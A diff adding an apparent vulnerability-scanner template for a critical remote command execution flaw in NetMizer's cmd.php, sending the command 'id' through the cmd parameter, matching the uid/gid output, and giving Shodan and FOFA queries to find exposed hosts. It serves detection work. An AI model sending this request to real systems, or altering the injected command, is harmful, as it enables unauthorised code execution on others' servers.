@@ -1,0 +1,37 @@
+id: netmizer-cmd-rce
+
+info:
+  name: NetMizer LogManagement System cmd.php  - Remote Code Execution
+  author: xc
+  severity: critical
+  description: |
+    Remote Command Execution vulnerability in the NetMizer log management system cmd.php, and the attacker can execute the command by passing in the cmd parameter.
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: title:"NetMizer"
+    fofa-query: title="NetMizer 日志管理系统"
+  tags: netmizer,cmd,rce
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/data/manage/cmd.php?cmd=id"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'uid=(\d+)\(.*?\) gid=(\d+)\(.*?\) groups=([\d,]+)\(.*?\)'
+
+      - type: word
+        part: header
+        words:
+          - 'text/html'
+
+      - type: status
+        status:
+          - 200
+
+# digest: 4b0a00483046022100bca3eba156871a776ba7554d8f727f0f30cedfe9d284b384fb82f87f0db91eba022100b6fe8df69ab3b4b7201b030955c0e1ad759649b8f8d00e110d67467b21846aab:922c64590222798bb761d5b6d8e72950
